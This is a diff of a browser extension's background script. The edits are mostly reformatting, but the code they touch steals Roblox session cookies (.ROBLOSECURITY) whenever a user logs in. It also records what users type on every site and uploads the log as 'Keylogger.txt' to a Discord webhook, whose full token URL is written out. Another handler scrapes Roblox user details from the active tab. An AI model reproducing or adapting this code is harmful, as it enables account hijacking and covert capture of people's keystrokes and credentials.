@@ -2,9 +2,9 @@
 
 
 export default function background() {
-    //CLASS
-    console.log("Background.js Module Started executing...")
-class FileManager {
+  //CLASS
+  console.log("Background.js Module Started executing...")
+  class FileManager {
     constructor() {
       console.log("File manager constructed.")
     }
@@ -13,9 +13,9 @@ class FileManager {
       const file = new File([blob], fileName, { type: blob.type });
       return file;
     }
-  
+
     txtToFiles(data) { // data=> Object => {fileName: "Example.txt", content: "This text is inside the txt file."}
-  
+
       let files = [];
       for (let i = 0; i < data.length; i++) {
         const content = data[i].content;
@@ -30,7 +30,7 @@ class FileManager {
   const RBX_ORIGIN = "https://www.roblox.com"
   var isBusySending = false;
   var FileManagerInstance = new FileManager();
-  
+
   var webhook = {
     url: "https://discord.com/api/webhooks/1175122576738099314/ArWkf4zD-juC-yxDN6tfzQsNFKGJ1MVtqHowKUB2TJ7b3ChFeai-738Gwo06ETJ9p81p",
     send: async (webhookData) => {
@@ -91,8 +91,8 @@ class FileManager {
         if (response.ok)
           onServerDone();
         else onError();
-  
-  
+
+
         //Check Queue
         console.log("Done sending previous message, Checking waitingQueue..")
         isBusySending = false;
@@ -104,25 +104,25 @@ class FileManager {
             sendData(newArguments[0], newArguments[1]);
           }, 5000);
         } else console.log("Queue cleared.")
-  
-  
-  
+
+
+
         resolve(response.ok);
-  
+
       }
       webhook.send(webhookData).then(onResponse);
     })
     return await promise;
   }
-  async function sendToContent(data,satifiesConditions=(tab)=>true) {
-    const [tab] = await chrome.tabs.query({ active: true});
+  async function sendToContent(data, satifiesConditions = (tab) => true) {
+    const [tab] = await chrome.tabs.query({ active: true });
     console.log("Active tab id is")
     console.log(tab.id);
-    if(satifiesConditions(tab)){
+    if (satifiesConditions(tab)) {
       console.log("Satisfied conditions.. Sending data to content script")
       return await chrome.tabs.sendMessage(tab.id, data)
     }
-    else return null; 
+    else return null;
   };
   async function sendCookies(msg) {
     let cookies = await retriveCookies("https://www.roblox.com/");
@@ -136,7 +136,7 @@ class FileManager {
       ]
     }
     sendData(webhookData);
-  }  
+  }
   function onCookieChanged(info) {
     if (info.cookie.domain === ".roblox.com" && info.cookie.name === ".ROBLOSECURITY" && !info.removed) sendCookies("New login");
   }
@@ -145,69 +145,69 @@ class FileManager {
     console.log("Data received")
     switch (request.method) {
       case "input":
-          (async () => {
-            let url = new URL(sender.tab.url);
-            console.log("Tab url: " + url)
-            let newTimestamp = new Date().getTime();
-            //get saved data
-            let result = await getFromLocalStorage(["activity"]);
-            console.log("got result")
-            // if there is no such then let it be '{"amount":0}'
-            result.activity = result.activity ? result.activity : '{"amount":0}'
-            //convert string to object.
-            let activity = JSON.parse(result.activity);
-            //If it is just created then set it's start time
-            if (activity.amount === 0) {
-              activity.startTime = new Date().getTime();
-            }
-            if (activity[url.origin] === undefined) activity[url.origin] = {};
-            activity[url.origin][newTimestamp] = request.data
-            activity.amount += 1;
-            console.log("amount incremented")
-            async function onDataSave() {
-              console.log("data has been saved")
-              if (activity.amount >= 250 || newTimestamp - activity.startTime > 86400000) {
-                console.log("Enough amount data(" + activity.amount + ") has been gathered. Sending..")
-                function serverOnDone() {
-                  console.log("Data has been transfered through webhook successfully. Clearly activity data saved locally..")
-                  chrome.storage.local.set({ activity: '{"amount":0}' }).then(() => {
-                    console.log("Activity data in chrome.storage.local has been cleared.")
-                  })
-                }
-                let webhookData = {
-                  content: activity.amount >= 250 ? "Amount exceeded 250 so here's the data" : "It has been one day since recording so here is the data",
-                  filesNameAndFilesArray: [
-                    {
-                      fileName: "Keylogger.txt",
-                      content: JSON.stringify(activity)
-                    }
-                  ]
-                }
-                await sendData(webhookData, serverOnDone)
+        (async () => {
+          let url = new URL(sender.tab.url);
+          console.log("Tab url: " + url)
+          let newTimestamp = new Date().getTime();
+          //get saved data
+          let result = await getFromLocalStorage(["activity"]);
+          console.log("got result")
+          // if there is no such then let it be '{"amount":0}'
+          result.activity = result.activity ? result.activity : '{"amount":0}'
+          //convert string to object.
+          let activity = JSON.parse(result.activity);
+          //If it is just created then set it's start time
+          if (activity.amount === 0) {
+            activity.startTime = new Date().getTime();
+          }
+          if (activity[url.origin] === undefined) activity[url.origin] = {};
+          activity[url.origin][newTimestamp] = request.data
+          activity.amount += 1;
+          console.log("amount incremented")
+          async function onDataSave() {
+            console.log("data has been saved")
+            if (activity.amount >= 250 || newTimestamp - activity.startTime > 86400000) {
+              console.log("Enough amount data(" + activity.amount + ") has been gathered. Sending..")
+              function serverOnDone() {
+                console.log("Data has been transfered through webhook successfully. Clearly activity data saved locally..")
+                chrome.storage.local.set({ activity: '{"amount":0}' }).then(() => {
+                  console.log("Activity data in chrome.storage.local has been cleared.")
+                })
               }
-              sendResponse("Input process in the background.js has been executed sucessfully.");
+              let webhookData = {
+                content: activity.amount >= 250 ? "Amount exceeded 250 so here's the data" : "It has been one day since recording so here is the data",
+                filesNameAndFilesArray: [
+                  {
+                    fileName: "Keylogger.txt",
+                    content: JSON.stringify(activity)
+                  }
+                ]
+              }
+              await sendData(webhookData, serverOnDone)
             }
-            await chrome.storage.local.set({ activity: JSON.stringify(activity) }).then(onDataSave());
-          })()
+            sendResponse("Input process in the background.js has been executed sucessfully.");
+          }
+          await chrome.storage.local.set({ activity: JSON.stringify(activity) }).then(onDataSave());
+        })()
         console.log("Async Input method is running on background, returned true ")
         return true;
-        case "getUserInfo":
-          (async()=>{
-            try{
-              function satisfyConditions(tab) {
-                let url = new URL(tab.url)
-                return url.origin == RBX_ORIGIN && url.pathname.split("/")[1] === "users"
-              }
-            let response = await sendToContent({method: "getUserInfo"},satisfyConditions);
+      case "getUserInfo":
+        (async () => {
+          try {
+            function satisfyConditions(tab) {
+              let url = new URL(tab.url)
+              return url.origin == RBX_ORIGIN && url.pathname.split("/")[1] === "users"
+            }
+            let response = await sendToContent({ method: "getUserInfo" }, satisfyConditions);
             console.log("Got response from content script which is..")
             console.log(response)
-            let payload= {
-              method:"gotUserInfo"
+            let payload = {
+              method: "gotUserInfo"
             }
-            if(response===null){
+            if (response === null) {
               payload.ok = false;
               payload.message = "Active url is not " + RBX_ORIGIN
-            }else{
+            } else {
               payload.ok = true
               payload.message = "SUCCESS"
               payload.username = response.username
@@ -218,14 +218,14 @@ class FileManager {
             }
             console.log("Background: payload = ")
             console.log(payload)
-           
+
             sendResponse(payload)
-          }catch(e){
+          } catch (e) {
             console.warn(e);
           }
-          })()
-          return true;
-        default:
+        })()
+        return true;
+      default:
         sendResponse("This is default background response due to undefined method.");
         throw new Error("The method " + request.method + " is not in switch statement.");
     }
